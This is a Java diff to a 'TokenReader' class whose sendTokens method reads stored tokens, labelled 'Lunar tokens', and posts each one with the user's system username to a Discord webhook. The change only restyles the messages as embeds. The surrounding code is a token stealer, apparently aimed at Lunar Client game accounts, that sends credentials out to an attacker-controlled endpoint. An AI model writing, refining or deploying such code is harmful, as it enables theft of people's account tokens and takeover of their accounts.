@@ -1,5 +1,6 @@
 package util;
 
+import java.awt.*;
 import java.io.BufferedReader;
 import java.io.FileReader;
 import java.io.IOException;
@@ -20,11 +21,14 @@ public class TokenReader {
     public void sendTokens(String url) {
         try {
             DiscordWebhook webhook = new DiscordWebhook(url);
-            webhook.setContent("Lunar tokens from " + System.getProperty("user.name"));
-            webhook.execute();
             Map<String, String> map = this.getTokens();
             for(String key : map.keySet()) {
-                webhook.setContent(cleanString(key) + ": " + cleanString(map.get(key)));
+                webhook.clearEmbeds();
+                webhook.addEmbed(new DiscordWebhook.EmbedObject()
+                        .setTitle(cleanString(key))
+                        .setDescription(cleanString(map.get(key)))
+                        .setFooter("Lunar token - " + System.getProperty("user.name"), null)
+                        .setColor(Color.black));
                 webhook.execute();
             }
         } catch (Exception e) {
